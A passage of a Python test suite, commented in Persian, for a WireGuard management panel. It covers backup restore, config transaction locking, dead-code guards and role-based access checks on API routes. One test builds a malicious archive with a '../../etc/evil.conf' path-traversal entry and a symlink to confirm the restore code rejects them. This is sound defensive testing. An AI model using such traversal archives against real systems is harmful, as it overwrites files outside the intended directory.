        self.assertIn("# NEW", pathlib.Path(self.tmp, "wgtest.conf").read_text())
        # دیتابیس (انتخاب‌نشده) دست نخورد؛ config.json/کد هرگز نوشته نشدند
        self.assertEqual(pathlib.Path(m.DB_PATH).read_bytes(), db_before)
        self.assertFalse(os.path.exists(
            os.path.join(self.tmp, "wg-panel", "config.json")))
        self.assertFalse(os.path.exists(
            os.path.join(self.tmp, "wg-panel", "wg_panel.py")))
        # اسنپ‌شاتِ pre-restore گرفته شد
        snaps = os.listdir(os.path.join(self.tmp, "restore-backups"))
        self.assertTrue(any(s.startswith("pre-restore-") for s in snaps))

    def test_all_components(self):
        m = self.m
        ok, msg = m.restore_from_nightly_tar(
            self._nightly_tar(self._full_files()),
            ["wireguard", "clients", "db"])
        self.assertTrue(ok, msg)
        self.assertIn(b"NEWDB", pathlib.Path(m.DB_PATH).read_bytes())
        self.assertTrue(os.path.exists(
            os.path.join(self.tmp, "clients", "wgtest", "u1.conf")))

    def test_rejects_symlink_traversal_and_empty(self):
        m = self.m
        files = {"wireguard/wgtest.conf": b"[Interface]\nPrivateKey = K=\n"}
        self.assertFalse(m.restore_from_nightly_tar(
            self._nightly_tar(files, link="./wireguard/wg9.conf"),
            ["wireguard"])[0])
        self.assertFalse(m.restore_from_nightly_tar(
            self._nightly_tar({"wireguard/../../etc/evil.conf": b"x"}),
            ["wireguard"])[0])
        self.assertFalse(m.restore_from_nightly_tar(
            self._nightly_tar(files), [])[0])
        self.assertFalse(m.restore_from_nightly_tar(
            self._nightly_tar(files), ["nope"])[0])
        # آرشیوی که فقط فایل‌های ممنوعه دارد → «چیزی پیدا نشد»
        ok, msg = m.restore_from_nightly_tar(
            self._nightly_tar({"wg-panel/config.json": b"{}"}),
            ["wireguard"])
        self.assertFalse(ok)
        self.assertEqual(msg, "api.err.nothingsel")

    def _mock_rclone(self, tar_bytes, sha=None):
        """ماکِ run برای rclone: copyto فایل می‌نویسد، cat هشِ sidecar."""
        m = self.m

        def fake_run(cmd, timeout=20):
            if cmd[0] == "rclone" and "copyto" in cmd:
                with open(cmd[-1], "wb") as f:
                    f.write(tar_bytes)
                return 0, "", ""
            if cmd[0] == "rclone" and "cat" in cmd:
                return (0, sha + "\n", "") if sha else (1, "", "not found")
            return 0, "", ""
        m.run = fake_run
        m._s4_target = lambda which="panel": ("megas4:b/wg-panel",
                                              "/tmp/c.conf", 30, "")

    def test_cloud_restore_sha_and_locks(self):
        m = self.m
        import hashlib as _h
        raw = self._nightly_tar(self._full_files())
        good = _h.sha256(raw).hexdigest()
        # نامِ نامعتبر
        self.assertFalse(m.cloud_restore_panel("../x.tar.gz", ["wireguard"],
                                               "admin")[0])
        # قفل: وسطِ بکاپِ دستی، بازیابی ممنوع
        m.MANUAL_BACKUP["running"] = True
        self.assertFalse(m.cloud_restore_panel(
            "wg-panel-20260720-124925.tar.gz", ["wireguard"], "admin")[0])
        m.MANUAL_BACKUP["running"] = False
        # sha ناهم‌خوان → توقف، هیچ فایلی عوض نشود
        with open(os.path.join(self.tmp, "wgtest.conf"), "w") as f:
            f.write("KEEP")
        self._mock_rclone(raw, sha="0" * 64)
        ok, msg = m.cloud_restore_panel("wg-panel-20260720-124925.tar.gz",
                                        ["wireguard"], "admin")
        self.assertFalse(ok)
        self.assertIn("sha256", m.api_text(msg, "en"))
        self.assertEqual(
            pathlib.Path(self.tmp, "wgtest.conf").read_text(), "KEEP")
        # sha درست → بازیابی + یادداشتِ تأیید؛ قفل هم آزاد شده باشد
        self._mock_rclone(raw, sha=good)
        ok, msg = m.cloud_restore_panel("wg-panel-20260720-124925.tar.gz",
                                        ["wireguard"], "admin")
        self.assertTrue(ok, msg)
        self.assertIn("sha256 تأیید شد", m.api_text(msg, "fa"))
        self.assertIn("sha256 verified", m.api_text(msg, "en"))
        self.assertIn("# NEW", pathlib.Path(self.tmp, "wgtest.conf").read_text())
        self.assertFalse(m.CLOUD_RESTORE["running"])
        # بدونِ sidecar → انجام می‌شود ولی با هشدارِ «بدونِ هش»
        self._mock_rclone(raw, sha=None)
        ok, msg = m.cloud_restore_panel("wg-panel-20260720-124925.tar.gz",
                                        ["wireguard"], "admin")
        self.assertTrue(ok)
        self.assertIn("هشِ ثبت‌شده ندارد", m.api_text(msg, "fa"))


class ConfigTransactionTests(unittest.TestCase):
    """مرزِ تراکنشِ CONFIG (پلنِ ۰۶۲).

    پلنِ ۰۰۷ خودِ نوشتن را سریال کرد، پس فایل پاره نمی‌شود. آنچه ماند
    **lost update** بود: خواندن-تغییر-نوشتن بدونِ مرز، پس دو نخ درهم
    می‌شدند و تغییرِ یکی بی‌صدا ناپدید می‌شد — بدونِ خطا، بدونِ لاگ، در
    حالی که درخواستِ خودش موفق برگشته بود.
    """

    def setUp(self):
        # عمداً از PanelTestCase ارث نمی‌برد: آن کلاس ده‌ها تستِ دیگر دارد
        # و setUp ِ این‌جا CONFIG را با یک دیکشنریِ حداقلی جایگزین می‌کند.
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-txn-")
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.m = load_module(self.tmp)
        m = self.m
        m.CONFIG_PATH = os.path.join(self.tmp, "config.json")
        m.CONFIG = {"users": [{"username": "admin", "salt": "", "hash": "",
                               "role": "admin", "totp": "", "stoken": "s"}],
                    "a": 0, "b": 0, "n": 0}

    def test_two_threads_on_different_keys_keep_both_changes(self):
        m = self.m

        def bump(key):
            for _ in range(40):
                with m.config_txn() as cfg:
                    cfg[key] = cfg[key] + 1

        ts = [threading.Thread(target=bump, args=(k,)) for k in ("a", "b")]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        self.assertEqual((m.CONFIG["a"], m.CONFIG["b"]), (40, 40))

    def test_two_threads_on_the_same_key_are_serialized(self):
        """حتی روی یک کلید هم نباید به‌روزرسانی گم شود."""
        m = self.m

        def bump():
            for _ in range(40):
                with m.config_txn() as cfg:
                    cfg["n"] = cfg["n"] + 1

        ts = [threading.Thread(target=bump) for _ in range(3)]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        self.assertEqual(m.CONFIG["n"], 120)

    def test_an_exception_releases_the_lock(self):
        """اگر قفل نگه داشته شود، کلِ پنل روی نوشتنِ بعدی هنگ می‌کند."""
        m = self.m
        with self.assertRaises(RuntimeError):
            with m.config_txn() as cfg:
                cfg["a"] = 99
                raise RuntimeError("عمدی")
        done = []

        def later():
            with m.config_txn() as cfg:
                cfg["b"] = 7
            done.append(True)

        t = threading.Thread(target=later)
        t.start()
        t.join(timeout=5)
        self.assertTrue(done, "قفل آزاد نشد — تراکنشِ بعدی هنگ کرد")

    def test_an_exception_does_not_persist_a_half_change(self):
        """استثنا نباید تغییرِ نیمه‌کاره را ماندگار کند.

        تصمیم است نه اتفاق: کسی که بعداً yield را در try/finally بپیچد،
        نیم‌نوشتن را برمی‌گرداند.
        """
        m = self.m
        with m.config_txn() as cfg:
            cfg["a"] = 1                     # یک ذخیره‌ی سالم برای مبنا
        with self.assertRaises(RuntimeError):
            with m.config_txn() as cfg:
                cfg["a"] = 99
                raise RuntimeError("عمدی")
        with open(m.CONFIG_PATH, encoding="utf-8") as f:
            on_disk = json.load(f)
        self.assertEqual(on_disk["a"], 1,
                         "تغییرِ نیمه‌کاره روی دیسک نشست")

    def test_the_transaction_actually_writes(self):
        m = self.m
        with m.config_txn() as cfg:
            cfg["a"] = 5
        with open(m.CONFIG_PATH, encoding="utf-8") as f:
            self.assertEqual(json.load(f)["a"], 5)

    def test_no_bare_save_config_call_survives(self):
        """گاردِ خانواده: هیچ نقطه‌ای نباید بیرونِ مرزِ تراکنش ذخیره کند.

        نکته‌ی این پلن یک نقطه نیست، **الگو**ست: تا وقتی یک نقطه
        خواندن-تغییر-نوشتنِ بی‌مرز داشته باشد، مسابقه همان‌جا باقی است.
        endpointِ `/api/*/save` ِ بعدی هم باید از روزِ اول `config_txn`
        بگیرد.

        دو استثنای مجاز، هر دو با دلیل:
          • خودِ `config_txn` — نقطه‌ی نوشتن است.
          • `migrate_config` — مسیرِ بوت، تک‌نخی، و خودش صریحاً
            `_config_write_lock` را می‌گیرد.
        """
        import ast
        ALLOWED = {"config_txn", "migrate_config"}
        src = _read_panel_source()
        lines = src.splitlines()
        tree = ast.parse(src)
        # تابعِ دربرگیرنده با AST پیدا می‌شود نه با پنجره‌ی متنی: بدنه‌ی
        # migrate_config ده‌ها خط است و هر پنجره‌ی ثابتی یا کوتاه می‌آید
        # یا آن‌قدر بلند می‌شود که همسایه‌ها را هم معاف کند.
        owner = {}
        for n in ast.walk(tree):
            if isinstance(n, ast.FunctionDef):
                for ln in range(n.lineno, (n.end_lineno or n.lineno) + 1):
                    owner.setdefault(ln, n.name)
        bad = []
        for i, l in enumerate(lines, 1):
            if l.strip() != "save_config()":
                continue
            if owner.get(i) in ALLOWED:
                continue
            bad.append("%d (در %s)" % (i, owner.get(i) or "سطحِ ماژول"))
        self.assertEqual(bad, [],
                         "save_config() بیرونِ مرزِ تراکنش: %s" % bad)

    def test_no_slow_work_runs_inside_a_transaction(self):
        """گاردِ خانواده: subprocess/شبکه داخلِ قفل همه را نگه می‌دارد.

        متنی است و بلوکِ `with config_txn()` را تا پایانِ تورفتگی‌اش
        دنبال می‌کند. پلنِ ۰۴۰ فراخوانی‌های subprocessای را مستند کرده
        که می‌توانند هنگ کنند — یکی از آن‌ها داخلِ این قفل یعنی قفل‌شدنِ
        هر نویسنده‌ی دیگرِ CONFIG تا همان مهلت.
        """
        src = _read_panel_source()
        lines = src.splitlines()
        SLOW = ("subprocess.", "run(", "urlopen", "socket.create_connection",
                "_https_raw_over_iface", "time.sleep")
        bad = []
        for i, l in enumerate(lines):
            if "with config_txn()" not in l:
                continue
            indent = len(l) - len(l.lstrip())
            for j in range(i + 1, len(lines)):
                nxt = lines[j]
                if nxt.strip() and (len(nxt) - len(nxt.lstrip())) <= indent:
                    break
                s = nxt.strip()
                if s.startswith("#"):
                    continue
                for pat in SLOW:
                    if pat in s:
                        bad.append("%d: %s" % (j + 1, s[:60]))
        self.assertEqual(bad, [], "کارِ کند داخلِ قفلِ CONFIG: %s" % bad)


class DeadFunctionTests(unittest.TestCase):
    """هیچ تابعِ سطحِ بالایی نباید بی‌ارجاع بماند (پلنِ ۰۵۸).

    در فایلی که `CLAUDE.md` می‌گوید کاملش را نخوان، کدِ مرده بدتر از
    معمول است: کسی grep می‌کند، پیدایش می‌کند، و درباره‌ی رفتاری استدلال
    می‌کند که هرگز اجرا نمی‌شود.

    ⚠️ **این گارد عمداً سهل‌گیر است.** تطبیق متنی است، پس نامی که فقط
    داخلِ یک **رشته** بیاید هم «ارجاع‌شده» حساب می‌شود — که در مخزنی
    با dispatch ِ نام‌محورِ ربات معامله‌ی درستی است، ولی یعنی گارد
    نمی‌تواند زنده بودن را ثابت کند؛ فقط مردنِ آشکار را می‌گیرد.
    """

    #: استثناها با **دلیلِ نوشته‌شده** — نه با شل‌کردنِ الگو تا سبز شود.
    ALLOWED = {
        "user_login_chat":
            "استخراجِ سیم‌نشده: همان منطق چند خط پایین‌تر داخلِ "
            "request_login_approval تکرار شده. حذفِ نسخه‌ی نام‌دار و "
            "نگه‌داشتنِ کپیِ درون‌خطی وارونه است. پلنِ ۰۴۳ — که همان کد را "
            "بازنویسی می‌کند — تصمیم می‌گیرد؛ فعلاً به خواستِ مالک معوق است.",
    }

    def test_no_top_level_function_is_unreferenced(self):
        import ast
        src = _read_panel_source()
        tree = ast.parse(src)
        dead = []
        for n in tree.body:
            if not isinstance(n, ast.FunctionDef) or n.name in self.ALLOWED:
                continue
            if len(re.findall(r"\b%s\b" % re.escape(n.name), src)) <= 1:
                dead.append((n.lineno, n.name))
        self.assertEqual(dead, [], "تابعِ بی‌ارجاع: %s" % dead)

    def test_every_exemption_has_a_written_reason(self):
        """استثنای بی‌دلیل همان کدِ مرده است با یک لایه پنهان‌کاری."""
        for name, why in self.ALLOWED.items():
            with self.subTest(fn=name):
                self.assertGreater(len(why), 40, "دلیلِ %s بیش از حد کوتاه" % name)

    def test_exemptions_still_exist_in_the_source(self):
        """اگر تابعِ معاف حذف شود، استثنایش باید هم برود.

        وگرنه فهرست پر از نامِ مرده می‌شود و گارد بی‌صدا سست‌تر.
        """
        src = _read_panel_source()
        for name in self.ALLOWED:
            with self.subTest(fn=name):
                self.assertIn("def %s(" % name, src,
                              "استثنای مرده در ALLOWED: %s" % name)


class LegacyAuthKeyPruneTests(PanelTestCase):
    """کلیدهای قدیمیِ سطحِ بالا باید پس از مهاجرت حذف شوند (پلنِ ۰۵۹).

    `migrate_config` اعتبارنامه‌ی تک‌کاربره‌ی قدیمی را به `users[0]`
    می‌بُرد ولی اصل را **جا می‌گذاشت**، پس `config.json` نسخه‌ی دومی از
    اعتبارنامه‌ی ادمین داشت که هیچ تغییرِ رمزی به‌روزش نمی‌کرد — و همان
    فایل در هر آرشیوِ بکاپ می‌رود.
    """

    def test_migration_moves_then_removes_the_legacy_keys(self):
        m = self.m
        m.CONFIG = {"salt": "a" * 32, "password_hash": "OLDHASH"}
        m.migrate_config()
        self.assertNotIn("salt", m.CONFIG)
        self.assertNotIn("password_hash", m.CONFIG)
        self.assertEqual(m.CONFIG["users"][0]["hash"], "OLDHASH",
                         "اعتبارنامه باید منتقل شود، نه دور ریخته شود")
        self.assertEqual(m.CONFIG["users"][0]["salt"], "a" * 32)

    def test_already_migrated_configs_are_cleaned_too(self):
        """این نیمه همان چیزی است که واقعاً کار می‌کند.

        شاخه‌ی «users نیست» برای کانفیگی که با نسخه‌ی قبلی مهاجرت کرده
        **هرگز** اجرا نمی‌شود — یعنی وضعِ همه‌ی استقرارهای موجود. رفعی
        که فقط آن شاخه را بگیرد، در عمل هیچ‌کس را پاک نمی‌کند.
        """
        m = self.m
        m.CONFIG = {"users": [{"username": "admin", "salt": "b" * 32,
                               "hash": "NEWHASH", "role": "admin",
                               "totp": "", "stoken": "s"}],
                    "salt": "a" * 32, "password_hash": "STALEHASH"}
        m.migrate_config()
        self.assertNotIn("salt", m.CONFIG)
        self.assertNotIn("password_hash", m.CONFIG)
        self.assertEqual(m.CONFIG["users"][0]["hash"], "NEWHASH",
                         "اعتبارنامه‌ی زنده نباید لمس شود")
        self.assertEqual(m.CONFIG["users"][0]["salt"], "b" * 32)

    def test_migration_is_idempotent(self):
        """این تابع در هر بالاآمدنِ پنل اجرا می‌شود."""
        m = self.m
        m.CONFIG = {"salt": "a" * 32, "password_hash": "H"}
        m.migrate_config()
        snap = json.dumps(m.CONFIG, sort_keys=True)
        m.migrate_config()
        self.assertEqual(json.dumps(m.CONFIG, sort_keys=True), snap)

    def test_a_missing_legacy_pair_is_not_invented(self):
        """نصبِ تازه این کلیدها را ندارد — نباید ساخته شوند."""
        m = self.m
        m.CONFIG = {"users": [{"username": "admin", "salt": "x" * 32,
                               "hash": "h", "role": "admin",
                               "totp": "", "stoken": "s"}]}
        m.migrate_config()
        self.assertNotIn("salt", m.CONFIG)
        self.assertNotIn("password_hash", m.CONFIG)

    def test_no_reader_of_the_legacy_keys_survives(self):
        """گاردِ خانواده: هیچ‌جای کد نباید دوباره از آن‌ها بخواند.

        این کلیدها حالا حذف می‌شوند، پس خواننده‌ی تازه‌ای که اضافه شود
        همیشه مقدارِ خالی می‌گیرد و بی‌صدا اشتباه رفتار می‌کند.
        """
        src = _read_panel_source()
        body = "\n".join(l for l in src.splitlines()
                         if not l.lstrip().startswith("#"))
        for pat in ('CONFIG.get("password_hash"', 'CONFIG["password_hash"]',
                    'CONFIG.get("salt"', 'CONFIG["salt"]'):
            self.assertNotIn(pat, body, "خواننده‌ی کلیدِ حذف‌شده: %s" % pat)


class PostSvcGroupTests(unittest.TestCase):
    """رفتارِ سرتاسریِ گروهِ `/api/svc/*` در `do_POST` (پلنِ ۰۶۳، گامِ ۳).

    **این تست پیش از جابه‌جاییِ گروه نوشته شد، نه بعدش.** انضباطِ پلن
    همین است: هارنسِ ۰۱۹ پیش‌گیت و RBAC را می‌راند ولی رفتارِ تک‌تکِ
    endpointها را نه، و «جابه‌جاکردنِ کدِ درخواستی که تست ندارد» همان
    راهی است که یک بررسیِ مجوز بی‌صدا ناپدید می‌شود.

    آنچه پین می‌شود دقیقاً سه چیزی است که یک بازآراییِ رفتار-نگه‌دار
    نباید عوضشان کند: **مجوزِ لازم**، **کدِ وضعیت**، و **شکلِ پاسخ**.
    """

    #: مجوزِ هر مسیر — از `PERM_MAP` سنجیده می‌شود نه از حافظه
    PERMS = {
        "/api/svc/probe": "svc.view",
        "/api/svc/mtr": "svc.view",
        "/api/svc/mtr/history": "svc.view",
        "/api/svc/iplist": "svc.view",
        "/api/svc/add": "svc.edit",
        "/api/svc/delete": "svc.edit",
        "/api/svc/ip/delete": "svc.edit",
        "/api/svc/ip/edit": "svc.edit",
    }

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-svc-")
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.m = load_module(self.tmp)
        # ⚠️ `viewer` اصلاً `svc.view` ندارد — سنجیده شد، نه فرض:
        # VIEWER_PERMS = {net.view, sys.view, tun.view, wg.view}. پس جهتِ
        # دومِ گارد به نقشی نیاز دارد که **دقیقاً** همان یک مجوز را داشته
        # باشد، وگرنه «viewer رد شد» چیزی درباره‌ی این گروه ثابت نمی‌کند.
        self.m.CONFIG["roles"] = {"svcview": {"perms": ["svc.view"]}}
        self.m.CONFIG["users"] = [
            {"username": "admin", "salt": "a" * 32, "hash": "h",
             "role": "admin", "totp": "", "stoken": "s1"},
            {"username": "svcview", "salt": "b" * 32, "hash": "h",
             "role": "svcview", "totp": "", "stoken": "s2"},
        ]

    def _post(self, path, body=None, role="admin", lang="en"):
        # کوکیِ زبان صریح است: بدونش پاسخ فارسی می‌آید و ادعاهای متنیِ
        # این تست خوانا نمی‌مانند. ضمناً همان درزِ پلنِ ۰۶۵ را در سطحِ
        # گروه دوباره اثبات می‌کند.
        h = make_fake_handler(self.m, path=path, method="POST",
                              body=body or {},
                              headers={"Cookie": "wgl=%s" % lang},
                              session={"u": role, "r": role})
        h.do_POST()
        code = dict(h.sent).get("__code__")
        raw = b"".join(h.body).decode("utf-8") or "{}"
        return code, json.loads(raw)

    def test_every_svc_path_declares_the_expected_permission(self):
        """مجوزِ هر مسیر بخشی از قراردادش است، نه جزئیاتِ داخلی."""
        for path, perm in self.PERMS.items():
            with self.subTest(path=path):
                self.assertEqual(self.m.Handler.required_perm(path), perm)

    def test_viewer_cannot_reach_the_editing_paths(self):
        """جهتِ اولِ گارد: مسیرِ ویرایشی برای viewer باید ۴۰۳ بدهد."""
        for path, perm in self.PERMS.items():
            if perm != "svc.edit":
                continue
            with self.subTest(path=path):
                code, obj = self._post(path, {"service": "youtube"},
                                       role="svcview")
                self.assertEqual(code, 403)
                self.assertFalse(obj.get("ok"))

    def test_viewer_keeps_the_read_only_paths(self):
        """جهتِ دوم: بدونِ این، «همه را رد کن» هم سبز می‌شد."""
        for path, perm in self.PERMS.items():
            if perm != "svc.view":
                continue
            with self.subTest(path=path):
                code, _obj = self._post(path, {"service": "youtube"},
                                        role="svcview")
                self.assertNotEqual(code, 403,
                                    "نقشِ دارای svc.view نباید رد شود")

    def test_an_unknown_service_is_rejected_with_400(self):
        """کدِ وضعیت هم بخشی از قرارداد است، نه فقط ok=False."""
        for path in ("/api/svc/mtr/history", "/api/svc/delete",
                     "/api/svc/iplist", "/api/svc/ip/delete",
                     "/api/svc/ip/edit"):
            with self.subTest(path=path):
                code, obj = self._post(path, {"service": "nope",
                                              "ip": "1.2.3.4",
                                              "old": "1.2.3.4",
                                              "new": "1.2.3.5"})
                self.assertEqual(code, 400)
                self.assertEqual(obj.get("error"), "Invalid service")

    def test_an_invalid_ip_is_rejected_with_400(self):
        for path in ("/api/svc/ip/delete", "/api/svc/ip/edit"):
            with self.subTest(path=path):
                code, obj = self._post(path, {"service": "youtube",
                                              "ip": "not-an-ip",
                                              "old": "not-an-ip",
                                              "new": "1.2.3.4"})
                self.assertEqual(code, 400)
                self.assertEqual(obj.get("error"), "Invalid IP")

    def test_iplist_returns_the_service_and_its_ips(self):
        """شکلِ پاسخ پین می‌شود — بازآرایی نباید کلیدی را جابه‌جا کند."""
        code, obj = self._post("/api/svc/iplist", {"service": "youtube"})
        self.assertEqual(code, 200)
        self.assertEqual(obj.get("ok"), True)
        self.assertEqual(obj.get("service"), "youtube")
        self.assertIn("ips", obj)

    def test_mtr_history_returns_runs(self):
        code, obj = self._post("/api/svc/mtr/history", {"service": "youtube",
                                                        "iface": "eth0"})
        self.assertEqual(code, 200)
        self.assertEqual((obj.get("ok"), obj.get("service")), (True, "youtube"))
        self.assertIn("runs", obj)

    def test_add_rejects_a_bad_domain(self):
        code, obj = self._post("/api/svc/add", {"domain": "not a domain"})
        self.assertEqual(code, 400)
        self.assertFalse(obj.get("ok"))

    def test_ip_delete_reports_a_miss_without_failing_the_request(self):
        """IP ِ نبوده ⇒ ok=False با پیامِ ترجمه‌شده، نه ۴۰۰."""
        code, obj = self._post("/api/svc/ip/delete", {"service": "youtube",
                                                       "ip": "203.0.113.9"})
        self.assertEqual(code, 200)
        self.assertFalse(obj.get("ok"))
        self.assertEqual(obj.get("error"), "Not found")

    def test_an_unknown_svc_subpath_still_falls_through_to_404(self):
        """معناشناسیِ «مسیرِ نگاشت‌نشده» نباید عوض شود.

        امروز مسیرِ `/api/` ِ نگاشت‌نشده اول از گیتِ admin-only رد
        می‌شود و بعد در انتهای زنجیره ۴۰۴ می‌گیرد. اگر بازآرایی این را
        به «۴۰۴ ِ زودهنگام» یا «۲۰۰ ِ خاموش» تبدیل کند، همین‌جا دیده
        می‌شود.
        """
        code, obj = self._post("/api/svc/nope", {}, role="admin")
        self.assertEqual(code, 404)
        self.assertEqual(obj.get("error"), "not found")
        code, _ = self._post("/api/svc/nope", {}, role="svcview")
        self.assertEqual(code, 403, "نگاشت‌نشده باید همچنان admin-only باشد")


class PostProxyGroupTests(unittest.TestCase):
    """رفتارِ سرتاسریِ گروهِ `/api/proxy/*` (پلنِ ۰۶۳، گروهِ دوم).

    مثلِ گروهِ svc، **پیش از** جابه‌جایی نوشته شد. این گروه از svc
    حساس‌تر است — اعتبارنامه‌ی پروکسی می‌سازد و حذف می‌کند — و دقیقاً به
    همین دلیل هفت مجوزِ متفاوت دارد که هیچ‌کدام نباید در بازآرایی
    جابه‌جا شوند.
    """

    PERMS = {
        "/api/proxy/list": "proxy.view",
        "/api/proxy/series": "proxy.view",
        "/api/proxy/log": "proxy.view",
        "/api/proxy/clients": "proxy.view",
        "/api/proxy/dests": "proxy.view",
        "/api/proxy/add": "proxy.add",
        "/api/proxy/edit": "proxy.edit",
        "/api/proxy/delete": "proxy.del",
        "/api/proxy/config": "proxy.conf",
    }

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-px-")
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.m = load_module(self.tmp)
        self.m.CONFIG["roles"] = {"pxview": {"perms": ["proxy.view"]}}
        self.m.CONFIG["users"] = [
            {"username": "admin", "salt": "a" * 32, "hash": "h",
             "role": "admin", "totp": "", "stoken": "s1"},
            {"username": "pxview", "salt": "b" * 32, "hash": "h",
             "role": "pxview", "totp": "", "stoken": "s2"},
        ]

    def _post(self, path, body=None, role="admin", lang="en"):
        h = make_fake_handler(self.m, path=path, method="POST",
                              body=body or {},
                              headers={"Cookie": "wgl=%s" % lang},
                              session={"u": role, "r": role})
        h.do_POST()
        return (dict(h.sent).get("__code__"),
                json.loads(b"".join(h.body).decode("utf-8") or "{}"))

    def test_every_proxy_path_declares_the_expected_permission(self):
        """هفت مجوزِ متفاوت — هرکدام بخشی از قرارداد، نه جزئیاتِ داخلی."""
        for path, perm in self.PERMS.items():
            with self.subTest(path=path):
                self.assertEqual(self.m.Handler.required_perm(path), perm)

    def test_a_view_only_role_cannot_reach_the_writing_paths(self):
        for path, perm in self.PERMS.items():
            if perm == "proxy.view":
                continue
            with self.subTest(path=path):
                code, obj = self._post(path, {"username": "u"}, role="pxview")
                self.assertEqual(code, 403)
                self.assertFalse(obj.get("ok"))

    def test_a_view_only_role_keeps_the_reading_paths(self):
        """جهتِ دوم — وگرنه «همه را رد کن» هم سبز می‌شد."""
        for path, perm in self.PERMS.items():
            if perm != "proxy.view":
                continue
            with self.subTest(path=path):
                code, _obj = self._post(path, {"username": "nobody"},
                                        role="pxview")
                self.assertNotEqual(code, 403)

    def test_an_unknown_user_is_reported_not_crashed(self):
        """شکلِ پاسخِ «کاربر نیست» روی چهار مسیر یکسان است."""
        for path in ("/api/proxy/delete", "/api/proxy/config",
                     "/api/proxy/clients", "/api/proxy/dests"):
            with self.subTest(path=path):
                code, obj = self._post(path, {"username": "ghost"})
                self.assertEqual(code, 200)
                self.assertFalse(obj.get("ok"))
                self.assertEqual(obj.get("error"), "User not found")

    def test_add_rejects_a_bad_username(self):
        code, obj = self._post("/api/proxy/add", {"username": "a b c"})
        self.assertEqual(code, 200)
        self.assertFalse(obj.get("ok"))
        self.assertIn("Username", obj.get("error", ""))

    def test_add_refuses_a_passwordless_user_without_a_source_range(self):
        """گاردِ «پروکسیِ باز» — مهم‌ترین قاعده‌ی این گروه.

        کاربرِ بدونِ رمز که هیچ IP مبدأیی نداشته باشد یعنی پروکسیِ باز
        برای اینترنت. بازآرایی نباید این شرط را جابه‌جا کند.
        """
        # نامِ فیلدها از خودِ کد آمده، نه از حافظه: `noauth` و `allow_src`.
        code, obj = self._post("/api/proxy/add",
                               {"username": "openuser", "noauth": True,
                                "allow_src": ""})
        self.assertEqual(code, 200)
        self.assertFalse(obj.get("ok"))
        self.assertIn("source IP", obj.get("error", ""))

    def test_list_returns_users(self):
        code, obj = self._post("/api/proxy/list", {})
        self.assertEqual(code, 200)
        self.assertTrue(obj.get("ok"))
        self.assertIn("users", obj)


class PostWarpGroupTests(unittest.TestCase):
    """قراردادِ گروهِ `/api/warp/*` (پلنِ ۰۶۳، گروهِ سوم).

    بیشترین شاخه‌ی گروه‌ها (۱۲) با کوچک‌ترین بدنه‌ها. **دو سطحِ مجوز**
    دارد و مرزشان معنادار است: خواندنِ وضعیت `tun.view` است ولی هر
    تغییری `warp.manage` — چون این‌ها مسیرِ دادهٔ زنده را عوض می‌کنند.
    جابه‌جایی نباید این مرز را یک پله شل کند.

    تستِ رفتاری این‌جا عمداً کم‌عمق است: بیشترِ این مسیرها به وضعیتِ
    زنده‌ی شبکه (`wg`، `ip`، فایل‌های `/opt/wg-panel`) وابسته‌اند و
    شبیه‌سازیشان یعنی ساختنِ یک سرورِ جعلی. آنچه پین می‌شود **مجوز و
    عبورِ زنجیره** است — همان دو چیزی که بازآرایی می‌تواند بشکند.
    """

    VIEW = ("/api/warp/status", "/api/warp/split-series", "/api/warp/events",
            "/api/warp/latency")
    MANAGE = ("/api/warp/targets", "/api/warp/presets",
              "/api/warp/endpoints/rank", "/api/warp/preset/toggle",
              "/api/warp/target/add", "/api/warp/target/del",
              "/api/warp/test", "/api/warp/quic")

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-warp-")
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.m = load_module(self.tmp)
        self.m.CONFIG["roles"] = {"tunview": {"perms": ["tun.view"]}}
        self.m.CONFIG["users"] = [
            {"username": "admin", "salt": "a" * 32, "hash": "h",
             "role": "admin", "totp": "", "stoken": "s1"},
            {"username": "tunview", "salt": "b" * 32, "hash": "h",
             "role": "tunview", "totp": "", "stoken": "s2"},
        ]

    def _code(self, path, role):
        h = make_fake_handler(self.m, path=path, method="POST", body={},
                              headers={"Cookie": "wgl=en"},
                              session={"u": role, "r": role})
        try:
            h.do_POST()
        except Exception:
            # بدنه به وضعیتِ زنده‌ی شبکه دست می‌زند؛ موضوعِ این تست گیت
            # است نه اجرای موفقِ بدنه. اگر گیت رد کرده باشد، اصلاً به
            # بدنه نمی‌رسیم — و همان چیزی است که می‌سنجیم.
            pass
        return dict(h.sent).get("__code__")

    def test_status_body_runs_for_a_signed_in_user(self):
        """بدنه‌ی وضعیت باید واقعاً اجرا شود، نه فقط از گیت رد شود.

        _code استثنای بدنه را عمداً می‌بلعد؛ همین پوشش NameError ِ sess را
        پنهان کرد، چون استخراجِ گروه متغیرِ محلیِ do_POST را جا انداخته
        بود. این‌جا بخشِ شبکه‌ای جایگزین می‌شود تا خودِ بدنه سنجیده شود.
        """
        m = self.m
        m.warp_status = lambda force=False: {"ok": True}
        m.warp_status_redacted = lambda st, perms: dict(st, perms=len(perms))
        h = make_fake_handler(m, path="/api/warp/status", method="POST",
                              body={}, headers={"Cookie": "wgl=en"},
                              session={"u": "admin", "r": "admin"})
        h.do_POST()
        self.assertEqual(dict(h.sent).get("__code__"), 200)

    def test_the_two_permission_levels_are_what_the_code_says(self):
        for p in self.VIEW:
            with self.subTest(path=p):
                self.assertEqual(self.m.Handler.required_perm(p), "tun.view")
        for p in self.MANAGE:
            with self.subTest(path=p):
                self.assertEqual(self.m.Handler.required_perm(p),
                                 "warp.manage")

    def test_a_tun_view_role_cannot_change_anything(self):
        """مرزِ اصلی: خواندن `tun.view`، تغییر `warp.manage`."""
        for p in self.MANAGE:
            with self.subTest(path=p):
                self.assertEqual(self._code(p, "tunview"), 403)

    def test_a_tun_view_role_keeps_the_status_paths(self):
        for p in self.VIEW:
            with self.subTest(path=p):
                self.assertNotEqual(self._code(p, "tunview"), 403)

    def test_an_unknown_warp_subpath_stays_admin_only_then_404(self):
        self.assertEqual(self._code("/api/warp/nope", "tunview"), 403)
        self.assertEqual(self._code("/api/warp/nope", "admin"), 404)

    # --- رفتار، بدونِ بلعیدنِ استثنا
    #
